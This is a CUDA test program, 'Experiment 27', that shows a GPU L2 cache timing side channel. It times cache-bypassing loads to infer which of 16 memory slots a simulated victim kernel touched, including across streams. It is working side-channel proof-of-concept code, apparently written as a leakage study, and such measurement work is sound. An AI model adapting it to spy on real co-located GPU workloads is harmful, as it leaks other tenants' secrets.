/*
 * Experiment 27: GPU L2 Cache Timing Side-Channel (Prime+Probe)
 *
 * GPU L2 cache is shared across all SMs on the same GPU. When a victim
 * process (or kernel) accesses certain memory regions, those cache lines
 * are loaded into L2. An attacker kernel can detect which L2 cache sets
 * were used by the victim by probing access latency — cache hit = victim
 * accessed that region, cache miss = it did not.
 *
 * This is a GPU analog of the classic CPU Prime+Probe cache side-channel.
 *
 * H100 specs:
 *   L2 cache: 50 MB total, 512-byte cache lines, ~100K cache lines
 *   L2 associativity: 8-way set-associative → ~12.5K sets
 *   LLC latency: ~200 cycles (hit) vs ~500+ cycles (DRAM miss)
 *
 * Method:
 *   PRIME:   Fill attacker's buffer → evict victim's cache lines
 *   VICTIM:  Access a secret-dependent address region (simulated)
 *   PROBE:   Time attacker's buffer re-access → slow = victim used that set
 *
 * This test uses the simplified FLUSH+RELOAD model on GPU:
 *   1. Victim accesses d_victim[secret_offset]
 *   2. Attacker times access to d_probe[0..N] with clock64()
 *   3. Lower latency at offset = victim accessed that address
 *
 * Tests:
 *   A. Baseline: attacker probes own buffer with no victim → latency baseline
 *   B. Signal: victim accesses address, attacker detects via timing
 *   C. Secret inference: victim accesses one of 16 possible offsets based
 *      on a secret value — attacker infers which offset (and thus the secret)
 *   D. Cross-kernel: victim and attacker in separate streams, same device
 *
 * Compile:
 *   nvcc -O2 -arch=sm_90 -o l2_timing l2_timing.cu
 */

#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHECK(call) do { cudaError_t _e=(call); if(_e!=cudaSuccess){ \
    fprintf(stderr,"[RT] %s:%d %s\n",__FILE__,__LINE__,cudaGetErrorString(_e)); exit(1); } } while(0)

/* L2 cache line = 128 bytes on H100. Stride by full L2 size to evict. */
#define L2_SIZE   (50 * 1024 * 1024)   /* 50 MB H100 L2 */
#define STRIDE    (128)                  /* cache line size bytes */
#define PROBE_N   (L2_SIZE / STRIDE)     /* number of cache lines to probe */
#define SLOT_SIZE (2 * 1024 * 1024)      /* 2 MB per secret slot */
#define N_SLOTS   16                     /* 16 possible secret values */

/* ---- Utility: flush L2 by accessing large buffer ---- */
__global__ void flush_l2(volatile float *buf, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    float sum = 0.0f;
    for (int j = i; j < n; j += stride)
        sum += buf[j];
    /* prevent DCE */
    if (threadIdx.x == 0 && blockIdx.x == 0 && sum == 0.12345f)
        buf[0] = sum;
}

/* ---- Victim kernel: accesses d_victim[secret_slot * SLOT_SIZE/4 .. ] ---- */
__global__ void victim_access(volatile float *d_victim, int secret_slot, int slot_floats) {
    int base = secret_slot * slot_floats;
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    float sum = 0.0f;
    /* Touch every cache line in the secret slot */
    for (int j = i; j < slot_floats; j += stride)
        sum += d_victim[base + j];
    if (threadIdx.x == 0 && blockIdx.x == 0 && sum == 0.12345f)
        d_victim[base] = sum;
}

/* ---- Probe kernel: single-thread sequential probe for same-SM clock ---- */
/* Using __ldcg to bypass L1, force L2/DRAM access */
__device__ __forceinline__ float ldcg(const float *p) {
    float v;
    asm volatile ("ld.global.cg.f32 %0, [%1];" : "=f"(v) : "l"(p));
    return v;
}

__global__ void probe_slots(volatile float *d_probe, int slot_floats, int n_slots,
                             long long *d_latencies) {
    /* SINGLE thread, sequential probe — all measurements on same SM clock */
    if (blockIdx.x != 0 || threadIdx.x != 0) return;

    for (int s = 0; s < n_slots; s++) {
        const float *base = (const float *)d_probe + (long long)s * slot_floats;
        /* Touch 4 cache lines (512 bytes) for stronger signal */
        long long t0 = clock64();
        float sum = ldcg(base)
                  + ldcg(base + 32)
                  + ldcg(base + 64)
                  + ldcg(base + 96);
        long long t1 = clock64();
        d_latencies[s] = t1 - t0;
        /* prevent DCE */
        if (sum == 0.12345f) d_latencies[s] += 1;
    }
}

/* Evict all slots from L2 by writing different data */
__global__ void evict_all(volatile float *d_probe, int n_floats, float val) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    for (int j = i; j < n_floats; j += stride)
        d_probe[j] = val;
}

/* Warm up cache for a specific slot */
__global__ void warm_slot(volatile float *d_probe, int slot, int slot_floats) {
    int base = slot * slot_floats;
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    float sum = 0.0f;
    for (int j = i; j < slot_floats; j += stride)
        sum += d_probe[base + j];
    if (threadIdx.x == 0 && blockIdx.x == 0 && sum == 0.12345f)
        d_probe[base] = sum;
}

int main() {
    CHECK(cudaSetDevice(0));
    cudaDeviceProp prop;
    CHECK(cudaGetDeviceProperties(&prop, 0));
    printf("=== Experiment 27: GPU L2 Cache Timing Side-Channel (Prime+Probe) ===\n");
    printf("    Device: %s  SMs=%d  L2=%d MB  clockRate=%d MHz\n\n",
           prop.name, prop.multiProcessorCount,
           prop.l2CacheSize / (1024*1024), prop.clockRate / 1000);

    const int SLOT_FLOATS = SLOT_SIZE / sizeof(float);
    const int TOTAL_FLOATS = N_SLOTS * SLOT_FLOATS;

    /* Allocate probe/victim buffer — same buffer, different slots */
    float *d_probe;
    CHECK(cudaMalloc(&d_probe, (size_t)TOTAL_FLOATS * sizeof(float)));
    CHECK(cudaMemset(d_probe, 0, (size_t)TOTAL_FLOATS * sizeof(float)));

    long long *d_latencies, *h_latencies;
    CHECK(cudaMalloc(&d_latencies, N_SLOTS * sizeof(long long)));
    h_latencies = (long long *)malloc(N_SLOTS * sizeof(long long));

    /* L2 flush buffer (larger than L2) */
    float *d_flush;
    CHECK(cudaMalloc(&d_flush, (size_t)L2_SIZE * 2));

    int blocks = (TOTAL_FLOATS + 255) / 256;
    int probe_blocks = (N_SLOTS + 31) / 32;

    printf("  Probe buffer: %d MB  (%d slots x %d MB each)\n\n",
           TOTAL_FLOATS * 4 / (1024*1024), N_SLOTS, SLOT_SIZE / (1024*1024));

    /* ================================================================
     * Test A: Baseline latency — all slots evicted, then probed
     * ================================================================ */
    printf("[Test A] Baseline latency (all slots cold — no victim)\n");
    {
        /* Evict all slots */
        evict_all<<<blocks, 256>>>(d_probe, TOTAL_FLOATS, 1.0f);
        flush_l2<<<1024, 256>>>(d_flush, L2_SIZE * 2 / sizeof(float));
        CHECK(cudaDeviceSynchronize());

        /* Probe */
        CHECK(cudaMemset(d_latencies, 0, N_SLOTS * sizeof(long long)));
        probe_slots<<<probe_blocks, 32>>>(d_probe, SLOT_FLOATS, N_SLOTS, d_latencies);
        CHECK(cudaDeviceSynchronize());

        CHECK(cudaMemcpy(h_latencies, d_latencies, N_SLOTS * sizeof(long long),
                         cudaMemcpyDeviceToHost));

        long long sum = 0, mx = 0, mn = h_latencies[0];
        for (int i = 0; i < N_SLOTS; i++) {
            sum += h_latencies[i];
            if (h_latencies[i] > mx) mx = h_latencies[i];
            if (h_latencies[i] < mn) mn = h_latencies[i];
        }
        printf("  Cold (evicted) latency: min=%lld  max=%lld  avg=%lld cycles\n",
               mn, mx, sum / N_SLOTS);

        /* Warm all slots, then reprobe */
        for (int s = 0; s < N_SLOTS; s++)
            warm_slot<<<(SLOT_FLOATS+255)/256, 256>>>(d_probe, s, SLOT_FLOATS);
        CHECK(cudaDeviceSynchronize());

        CHECK(cudaMemset(d_latencies, 0, N_SLOTS * sizeof(long long)));
        probe_slots<<<probe_blocks, 32>>>(d_probe, SLOT_FLOATS, N_SLOTS, d_latencies);
        CHECK(cudaDeviceSynchronize());

        CHECK(cudaMemcpy(h_latencies, d_latencies, N_SLOTS * sizeof(long long),
                         cudaMemcpyDeviceToHost));

        sum = 0; mx = 0; mn = h_latencies[0];
        for (int i = 0; i < N_SLOTS; i++) {
            sum += h_latencies[i];
            if (h_latencies[i] > mx) mx = h_latencies[i];
            if (h_latencies[i] < mn) mn = h_latencies[i];
        }
        printf("  Warm (cached) latency:  min=%lld  max=%lld  avg=%lld cycles\n", mn, mx, sum/N_SLOTS);

        long long cold_avg = sum / N_SLOTS; /* repurpose, actually warm */
        (void)cold_avg;
    }

    /* ================================================================
     * Test B: Signal detection — victim accesses slot 7, attacker detects
     * ================================================================ */
    printf("\n[Test B] Signal detection (victim accesses slot 7, attacker detects)\n");
    {
        const int VICTIM_SLOT = 7;
        int correct = 0;

        for (int trial = 0; trial < 20; trial++) {
            /* PRIME: evict all */
            evict_all<<<blocks, 256>>>(d_probe, TOTAL_FLOATS, (float)trial);
            flush_l2<<<1024, 256>>>(d_flush, L2_SIZE * 2 / sizeof(float));
            CHECK(cudaDeviceSynchronize());

            /* VICTIM: access slot 7 */
            victim_access<<<(SLOT_FLOATS+255)/256, 256>>>(d_probe, VICTIM_SLOT, SLOT_FLOATS);
            CHECK(cudaDeviceSynchronize());

            /* PROBE */
            CHECK(cudaMemset(d_latencies, 0, N_SLOTS * sizeof(long long)));
            probe_slots<<<probe_blocks, 32>>>(d_probe, SLOT_FLOATS, N_SLOTS, d_latencies);
            CHECK(cudaDeviceSynchronize());

            CHECK(cudaMemcpy(h_latencies, d_latencies, N_SLOTS * sizeof(long long),
                             cudaMemcpyDeviceToHost));

            /* Infer: which slot has minimum latency (= was cached by victim)? */
            int min_slot = 0;
            long long min_lat = h_latencies[0];
            for (int i = 1; i < N_SLOTS; i++)
                if (h_latencies[i] < min_lat) { min_lat = h_latencies[i]; min_slot = i; }

            if (min_slot == VICTIM_SLOT) correct++;
        }
        printf("  Correct inference: %d/20 trials  (victim_slot=%d)\n", correct, VICTIM_SLOT);
        if (correct >= 15)
            printf("  [!!!] L2 TIMING SIDE-CHANNEL: attacker correctly identified victim's slot\n");
        else if (correct >= 8)
            printf("  [~] WEAK SIGNAL: some timing distinguishability\n");
        else
            printf("  SAFE: timing not distinguishable (correct=%d/20)\n", correct);
    }

    /* ================================================================
     * Test C: Secret inference across 16 slots (4-bit secret)
     * ================================================================ */
    printf("\n[Test C] 4-bit secret inference (victim accesses 1 of 16 slots)\n");
    {
        int total_correct = 0;
        const int TRIALS_PER_SECRET = 10;

        for (int secret = 0; secret < N_SLOTS; secret++) {
            int correct = 0;
            for (int trial = 0; trial < TRIALS_PER_SECRET; trial++) {
                /* PRIME */
                evict_all<<<blocks, 256>>>(d_probe, TOTAL_FLOATS, (float)(secret * 100 + trial));
                flush_l2<<<1024, 256>>>(d_flush, L2_SIZE * 2 / sizeof(float));
                CHECK(cudaDeviceSynchronize());

                /* VICTIM */
                victim_access<<<(SLOT_FLOATS+255)/256, 256>>>(d_probe, secret, SLOT_FLOATS);
                CHECK(cudaDeviceSynchronize());

                /* PROBE */
                CHECK(cudaMemset(d_latencies, 0, N_SLOTS * sizeof(long long)));
                probe_slots<<<probe_blocks, 32>>>(d_probe, SLOT_FLOATS, N_SLOTS, d_latencies);
                CHECK(cudaDeviceSynchronize());

                CHECK(cudaMemcpy(h_latencies, d_latencies, N_SLOTS * sizeof(long long),
                                 cudaMemcpyDeviceToHost));

                int min_slot = 0;
                long long min_lat = h_latencies[0];
                for (int i = 1; i < N_SLOTS; i++)
                    if (h_latencies[i] < min_lat) { min_lat = h_latencies[i]; min_slot = i; }

                if (min_slot == secret) correct++;
            }
            if (correct >= TRIALS_PER_SECRET / 2) total_correct++;
            printf("  Secret=%2d: correct=%d/%d  %s\n",
                   secret, correct, TRIALS_PER_SECRET,
                   correct >= TRIALS_PER_SECRET/2 ? "[HIT]" : "[miss]");
        }
        printf("  Secrets correctly inferred: %d/%d  (random baseline: 1/16 = 6.25%%)\n",
               total_correct, N_SLOTS);
        if (total_correct >= 12)
            printf("  [!!!] L2 TIMING ATTACK: attacker infers 4-bit secret from timing\n");
        else if (total_correct >= 6)
            printf("  [~] PARTIAL SIGNAL: better than random, some leakage\n");
        else
            printf("  SAFE: timing not sufficient to infer secret (noise dominates)\n");
    }

    /* ================================================================
     * Test D: Cross-stream timing — victim in stream A, attacker in stream B
     * ================================================================ */
    printf("\n[Test D] Cross-stream L2 timing (victim stream A, attacker stream B)\n");
    {
        cudaStream_t sA, sB;
        CHECK(cudaStreamCreate(&sA));
        CHECK(cudaStreamCreate(&sB));

        const int VICTIM_SLOT = 11;
        int correct = 0;

        for (int trial = 0; trial < 20; trial++) {
            /* PRIME on stream B */
            evict_all<<<blocks, 256, 0, sB>>>(d_probe, TOTAL_FLOATS, (float)trial);
            flush_l2<<<1024, 256, 0, sB>>>(d_flush, L2_SIZE * 2 / sizeof(float));
            CHECK(cudaStreamSynchronize(sB));

            /* VICTIM on stream A */
            victim_access<<<(SLOT_FLOATS+255)/256, 256, 0, sA>>>(d_probe, VICTIM_SLOT, SLOT_FLOATS);
            CHECK(cudaStreamSynchronize(sA));

            /* PROBE on stream B */
            CHECK(cudaMemsetAsync(d_latencies, 0, N_SLOTS * sizeof(long long), sB));
            probe_slots<<<probe_blocks, 32, 0, sB>>>(d_probe, SLOT_FLOATS, N_SLOTS, d_latencies);
            CHECK(cudaStreamSynchronize(sB));

            CHECK(cudaMemcpy(h_latencies, d_latencies, N_SLOTS * sizeof(long long),
                             cudaMemcpyDeviceToHost));

            int min_slot = 0;
            long long min_lat = h_latencies[0];
            for (int i = 1; i < N_SLOTS; i++)
                if (h_latencies[i] < min_lat) { min_lat = h_latencies[i]; min_slot = i; }

            if (min_slot == VICTIM_SLOT) correct++;
        }
        printf("  Cross-stream correct: %d/20  (victim_slot=%d)\n", correct, VICTIM_SLOT);
        if (correct >= 15)
            printf("  [!!!] CROSS-STREAM L2 TIMING: L2 state shared across streams\n");
        else
            printf("  NOISY: cross-stream timing less reliable (%d/20)\n", correct);

        CHECK(cudaStreamDestroy(sA));
        CHECK(cudaStreamDestroy(sB));
    }

    printf("\n[Done]\n");
    free(h_latencies);
    CHECK(cudaFree(d_probe));
    CHECK(cudaFree(d_latencies));
    CHECK(cudaFree(d_flush));
    return 0;
}
